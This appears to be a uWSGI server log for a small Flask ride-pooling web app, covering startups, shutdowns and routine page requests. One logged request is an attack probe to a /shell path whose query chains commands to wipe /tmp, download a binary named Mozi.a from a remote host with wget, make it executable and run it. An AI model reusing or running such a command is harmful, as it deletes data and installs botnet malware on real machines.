*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Apr 20 18:39:53 2021] ***
compiled with version: 9.3.0 on 18 April 2021 20:18:35
os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
nodename: ip-172-31-21-74
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/PES/FSC_MVP
detected binary path: /home/ubuntu/PES/web_app_env/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
your processes number limit is 3869
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address pes_ride.sock fd 3
Python version: 3.8.5 (default, Jan 27 2021, 15:41:15)  [GCC 9.3.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55879dbd8f90
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 437520 bytes (427 KB) for 5 cores
*** Operational MODE: preforking ***
/home/ubuntu/PES/web_app_env/lib/python3.8/site-packages/flask_sqlalchemy/__init__.py:872: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
  warnings.warn(FSADeprecationWarning(
WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55879dbd8f90 pid: 34818 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 34818)
spawned uWSGI worker 1 (pid: 34831, cores: 1)
spawned uWSGI worker 2 (pid: 34832, cores: 1)
spawned uWSGI worker 3 (pid: 34833, cores: 1)
spawned uWSGI worker 4 (pid: 34834, cores: 1)
spawned uWSGI worker 5 (pid: 34835, cores: 1)
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
worker 5 buried after 1 seconds
goodbye to uWSGI.
VACUUM: unix socket pes_ride.sock removed.
*** Starting uWSGI 2.0.19.1 (64bit) on [Tue Apr 20 18:41:43 2021] ***
compiled with version: 9.3.0 on 18 April 2021 20:18:35
os: Linux-5.4.0-1038-aws #40-Ubuntu SMP Fri Feb 5 23:50:40 UTC 2021
nodename: ip-172-31-21-74
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/PES/FSC_MVP
detected binary path: /home/ubuntu/PES/web_app_env/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
your processes number limit is 3869
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address pes_ride.sock fd 3
Python version: 3.8.5 (default, Jan 27 2021, 15:41:15)  [GCC 9.3.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55e6204e2f90
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 437520 bytes (427 KB) for 5 cores
*** Operational MODE: preforking ***
/home/ubuntu/PES/web_app_env/lib/python3.8/site-packages/flask_sqlalchemy/__init__.py:872: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
  warnings.warn(FSADeprecationWarning(
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55e6204e2f90 pid: 34878 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 34878)
spawned uWSGI worker 1 (pid: 34889, cores: 1)
spawned uWSGI worker 2 (pid: 34890, cores: 1)
spawned uWSGI worker 3 (pid: 34891, cores: 1)
spawned uWSGI worker 4 (pid: 34892, cores: 1)
spawned uWSGI worker 5 (pid: 34893, cores: 1)
[pid: 34889|app: 0|req: 1/1] 122.171.193.184 () {40 vars in 732 bytes} [Tue Apr 20 18:51:02 2021] GET / => generated 1189 bytes in 13 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34892|app: 0|req: 1/2] 122.171.193.184 () {40 vars in 713 bytes} [Tue Apr 20 18:51:02 2021] GET /static/images/PESlogo.jpeg => generated 7395 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
[pid: 34891|app: 0|req: 1/3] 122.171.193.184 () {40 vars in 705 bytes} [Tue Apr 20 18:51:02 2021] GET /static/images/road.png => generated 238711 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 275 bytes (0 switches on core 0)
[pid: 34890|app: 0|req: 1/4] 122.171.193.184 () {40 vars in 713 bytes} [Tue Apr 20 18:51:02 2021] GET /static/images/pooling.jpeg => generated 66206 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 7 headers in 274 bytes (0 switches on core 0)
[pid: 34889|app: 0|req: 2/5] 122.171.193.184 () {42 vars in 781 bytes} [Tue Apr 20 18:51:17 2021] GET /addRide => generated 3288 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34889|app: 0|req: 3/6] 209.17.96.114 () {30 vars in 405 bytes} [Tue Apr 20 20:15:04 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34889|app: 0|req: 4/7] 122.171.193.184 () {50 vars in 967 bytes} [Tue Apr 20 20:52:54 2021] POST /addRide => generated 311 bytes in 31 msecs (HTTP/1.1 200) 2 headers in 80 bytes (1 switches on core 0)
[pid: 34892|app: 0|req: 2/8] 122.171.193.184 () {42 vars in 774 bytes} [Tue Apr 20 20:53:01 2021] GET / => generated 1189 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34889|app: 0|req: 5/9] 122.171.193.184 () {42 vars in 783 bytes} [Tue Apr 20 20:53:05 2021] GET /findRide => generated 1322 bytes in 22 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34892|app: 0|req: 3/10] 122.171.193.184 () {42 vars in 775 bytes} [Tue Apr 20 20:53:28 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34891|app: 0|req: 2/11] 122.171.193.184 () {42 vars in 783 bytes} [Tue Apr 20 20:53:39 2021] GET /findRide => generated 1322 bytes in 32 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34889|app: 0|req: 6/12] 209.17.97.106 () {30 vars in 396 bytes} [Tue Apr 20 21:02:00 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.0 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 34889|app: 0|req: 7/13] 128.14.133.58 () {34 vars in 482 bytes} [Tue Apr 20 21:28:10 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
worker 5 buried after 1 seconds
goodbye to uWSGI.
VACUUM: unix socket pes_ride.sock removed.
*** Starting uWSGI 2.0.19.1 (64bit) on [Wed Apr 21 12:09:26 2021] ***
compiled with version: 9.3.0 on 18 April 2021 20:18:35
os: Linux-5.4.0-1045-aws #47-Ubuntu SMP Tue Apr 13 07:02:25 UTC 2021
nodename: ip-172-31-21-74
machine: x86_64
clock source: unix
detected number of CPU cores: 1
current working directory: /home/ubuntu/PES/FSC_MVP
detected binary path: /home/ubuntu/PES/web_app_env/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
your processes number limit is 3869
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to UNIX address pes_ride.sock fd 3
Python version: 3.8.5 (default, Jan 27 2021, 15:41:15)  [GCC 9.3.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55d1e34f0f90
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 437520 bytes (427 KB) for 5 cores
*** Operational MODE: preforking ***
/home/ubuntu/PES/web_app_env/lib/python3.8/site-packages/flask_sqlalchemy/__init__.py:872: FSADeprecationWarning: SQLALCHEMY_TRACK_MODIFICATIONS adds significant overhead and will be disabled by default in the future.  Set it to True or False to suppress this warning.
  warnings.warn(FSADeprecationWarning(
WSGI app 0 (mountpoint='') ready in 4 seconds on interpreter 0x55d1e34f0f90 pid: 431 (default app)
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 431)
spawned uWSGI worker 1 (pid: 791, cores: 1)
spawned uWSGI worker 2 (pid: 792, cores: 1)
spawned uWSGI worker 3 (pid: 793, cores: 1)
spawned uWSGI worker 4 (pid: 794, cores: 1)
spawned uWSGI worker 5 (pid: 795, cores: 1)
[pid: 793|app: 0|req: 1/1] 122.171.193.184 () {40 vars in 735 bytes} [Wed Apr 21 12:26:11 2021] GET / => generated 1189 bytes in 15 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 795|app: 0|req: 1/2] 122.171.193.184 () {40 vars in 719 bytes} [Wed Apr 21 12:26:13 2021] GET /static/images/PESlogo.jpeg => generated 7395 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 272 bytes (0 switches on core 0)
[pid: 791|app: 0|req: 1/3] 122.171.193.184 () {40 vars in 711 bytes} [Wed Apr 21 12:26:13 2021] GET /static/images/road.png => generated 238711 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 7 headers in 275 bytes (0 switches on core 0)
[pid: 794|app: 0|req: 1/4] 122.171.193.184 () {40 vars in 719 bytes} [Wed Apr 21 12:26:13 2021] GET /static/images/pooling.jpeg => generated 66206 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 7 headers in 274 bytes (0 switches on core 0)
[pid: 792|app: 0|req: 1/5] 122.171.193.184 () {40 vars in 689 bytes} [Wed Apr 21 12:26:14 2021] GET /favicon.ico => generated 232 bytes in 2 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
[pid: 793|app: 0|req: 2/6] 180.188.241.184 () {34 vars in 651 bytes} [Wed Apr 21 12:26:56 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://180.188.241.184:56559/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 232 bytes in 0 msecs (HTTP/1.1 404) 2 headers in 87 bytes (1 switches on core 0)
[pid: 793|app: 0|req: 3/7] 167.248.133.56 () {28 vars in 309 bytes} [Wed Apr 21 12:38:50 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 794|app: 0|req: 2/8] 167.248.133.56 () {34 vars in 441 bytes} [Wed Apr 21 12:38:50 2021] GET / => generated 1189 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 793|app: 0|req: 4/9] 143.198.205.13 () {34 vars in 442 bytes} [Wed Apr 21 12:51:40 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
[pid: 793|app: 0|req: 5/10] 31.24.202.205 () {32 vars in 462 bytes} [Wed Apr 21 12:58:24 2021] GET / => generated 1189 bytes in 0 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 0)
SIGINT/SIGQUIT received...killing workers...
worker 1 buried after 1 seconds
worker 2 buried after 1 seconds
worker 3 buried after 1 seconds
worker 4 buried after 1 seconds
worker 5 buried after 1 seconds
goodbye to uWSGI.
VACUUM: unix socket pes_ride.sock removed.
